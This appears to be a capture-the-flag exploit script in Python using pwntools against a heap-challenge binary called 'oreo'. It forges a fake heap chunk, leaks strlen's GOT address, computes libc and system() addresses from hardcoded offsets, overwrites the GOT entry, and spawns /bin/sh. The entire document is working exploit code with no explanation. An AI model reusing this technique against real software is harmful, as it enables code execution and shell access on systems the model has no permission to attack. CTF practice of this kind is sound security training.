#!/usr/bin/python
from pwn13 import *
#from pwn import *

strlen_got=0x804a250

def ADD(name, desc):
    p.sendline("1")
    p.sendline(name)
    p.sendline(desc)

def SHOW():
    p.sendline("2")
    data = p.recv()
    print data
    return data

def DEL():
    p.sendline("3")
    data = p.recv()
    print data

def LEAVE_MSG(msg):
    p.sendline("4")
    p.sendline(msg)

def STATS():
    p.sendline("5")
    data = p.recv()
    print data
    return data

def sol():
    #
    payload = p32(0)*9 + p32(0x1234)
    LEAVE_MSG(payload)
    #
    for i in range(0,0x40):
        ADD("a","a")
    ADD(p8(0x0)*27+p32(0x0804a2a8),"b")
    #

    DEL()
    print "1.==========="
    p.dump(0x804a250, 0x200)
    
    ADD("c",p32(strlen_got))
    print "2.==========="
    p.dump(0x804a250, 0x200)


    data = STATS()
    addr = data[data.rfind(":")+2:data.rfind(":")+6]
    strlen_addr = u32(addr)
    libc_base = strlen_addr - 0x7e2d0
    system_addr = libc_base + 0x3ada0
    print 'strlen addr', hex(strlen_addr)
    print 'libc base', hex(libc_base)
    print 'system addr', hex(system_addr)

    LEAVE_MSG(p32(system_addr)+";/bin/sh;")
    p.dump(0x804a250, 0x200)


if __name__=="__main__":
    p = process("./oreo")
    print p.recvuntil("Exit!")
    print p.recvline()

    sol()

    p.interactive()

    p.close()

